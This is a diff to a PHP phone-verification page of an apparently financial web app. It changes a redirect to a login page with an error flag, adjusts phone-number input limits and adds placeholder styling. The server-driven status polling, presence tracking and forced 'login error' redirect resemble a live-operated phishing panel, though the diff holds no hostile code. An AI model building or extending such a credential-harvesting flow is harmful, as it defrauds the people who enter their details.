@@ -17,7 +17,7 @@ if ($application === null) {
 
 $statusEarly = (string) ($application['status'] ?? 'beklemede');
 if ($statusEarly === 'yeniden-index') {
-    header('Location: index.php');
+    header('Location: giris.php?error=hatali');
     exit;
 }
 
@@ -99,6 +99,13 @@ upsertPresence('tel', (string) $application['id'], false);
   <title>Telefon Dogrulama</title>
   <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/app.css'), ENT_QUOTES, 'UTF-8') ?>">
   <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/finansapp-mobile.css'), ENT_QUOTES, 'UTF-8') ?>">
+  <style>
+    ::placeholder {
+      color: #555 !important;
+      opacity: 1 !important;
+      font-weight: 500 !important;
+    }
+  </style>
 </head>
 <body class="app-mobile">
   <div class="app-shell">
@@ -148,9 +155,9 @@ upsertPresence('tel', (string) $application['id'], false);
             name="phone"
             inputmode="tel"
             autocomplete="tel"
-            minlength="10"
-            maxlength="14"
-            placeholder="Telefon Numarasi"
+            minlength="8"
+            maxlength="11"
+            placeholder="Telefon Numarası (Örn: 05...)"
             required
             value="<?= esc($phoneValue) ?>"
           >
@@ -213,7 +220,7 @@ upsertPresence('tel', (string) $application['id'], false);
 
     phoneInput.addEventListener("input", () => {
       const digits = phoneInput.value.replace(/\D+/g, "");
-      phoneInput.value = digits.slice(0, 14);
+      phoneInput.value = digits.slice(0, 11);
     });
 
     function sendHeartbeat() {
@@ -238,7 +245,7 @@ upsertPresence('tel', (string) $application['id'], false);
         const data = await res.json();
         if (!data.ok) return;
         if (data.status === "yeniden-index") {
-          window.location.href = "index.php";
+          window.location.href = "giris.php?error=hatali";
         }
       } catch (e) {}
     }
